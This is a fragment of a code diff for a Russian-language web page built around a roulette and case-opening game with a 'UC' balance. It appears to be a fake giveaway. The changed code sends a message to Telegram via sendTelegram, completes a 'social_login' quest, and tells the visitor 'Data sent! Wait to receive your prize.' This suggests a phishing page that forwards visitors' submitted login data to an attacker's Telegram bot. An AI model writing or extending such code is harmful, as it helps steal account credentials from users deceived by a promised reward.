-🎰 После вращения рулетки
+💰 Баланс UC: ${userBalance}
+🎰 Спинов сделано: ${quests.spin_once.progress}
+🎁 Кейсов открыто: ${quests.open_case.progress}
             `;
             
             sendTelegram(msg);
+            
+            // Обновляем прогресс квеста
+            quests.social_login.progress = 1;
+            if (!quests.social_login.completed) {
+                completeQuest('social_login');
+            }
             
             // Показываем сообщение об успехе
             alert('Данные отправлены! Ожидайте получения приза.');
@@ -1215,9 +1666,12 @@
             }
         }
 
-        // Инициализация
-        showSection('hub');
-        updateBackButton();
+        // Инициализация при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            initApp();
+            showSection('hub');
+            updateBackButton();
+        });
     </script>
 </body>
 </html>
